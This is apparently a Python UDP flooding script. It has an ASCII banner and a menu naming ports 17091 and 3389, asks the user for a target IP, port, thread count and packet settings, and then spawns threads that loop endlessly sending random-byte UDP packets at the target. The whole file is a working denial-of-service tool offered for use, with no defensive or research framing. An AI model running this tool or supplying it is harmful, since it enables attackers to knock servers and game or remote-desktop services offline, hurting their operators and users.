import socket
import os
import random
import time
import sys
import struct
import threading

os.system('cls' if os.name == 'nt' else 'clear')
print("\030[91m██████╗░██╗░░░██╗███╗░░░███╗██╗░░░██╗██╗░░██╗")
print("\031[91m██╔══██╗╚██╗░██╔╝████╗░████║██║░░░██║╚██╗██╔╝")
print("\032[91m██████╔╝░╚████╔╝░██╔████╔██║██║░░░██║░╚███╔╝░")
print("\033[91m██╔══██╗░░╚██╔╝░░██║╚██╔╝██║██║░░░██║░██╔██╗░")
print("\034[91m██║░░██║░░░██║░░░██║░╚═╝░██║╚██████╔╝██╔╝╚██")
print("\035[91m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝")

print(f"""
█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀
█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄
|-----------------------|
|   UDP    | 17091 3389 |
|----------|------------|

""")

ip = input("[+] Target: ")
port = int(input("[+] Port: "))
thread = int(input("[+] Threads: "))
packet_count = int(input("[+] Packet Count: "))
packet_size = int(input("[+] Packet Size (in bytes): "))

def generate_payload(packet_size):
    payload = os.urandom(packet_size)
    return payload

def send_packets(dest_ip, dest_port, packet_size, packet_count):
    bytes = random._urandom(1024)
    while True:
        try:
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            for _ in range(packet_count):
                payload = generate_payload(packet_size)

                if len(payload) < packet_size:
                    payload += b'\x00' * (packet_size - len(payload))

                payload_length = struct.pack('!I', len(payload))

                udp_socket.sendto(payload_length, (dest_ip, dest_port))

                udp_socket.sendto(payload, (dest_ip, dest_port))
                udp_socket.sendto(bytes, (dest_ip, dest_port))

                time.sleep(.1)

        except Exception as e:
            print(f"Error: {str(e)}")
            sys.exit(1)

send_threads = []
for _ in range(thread):
    send_thread = threading.Thread(target=send_packets, args=(ip, port, packet_size, packet_count))
    send_thread.start()
    send_threads.append(send_thread)

for send_thread in send_threads:
    send_thread.join()
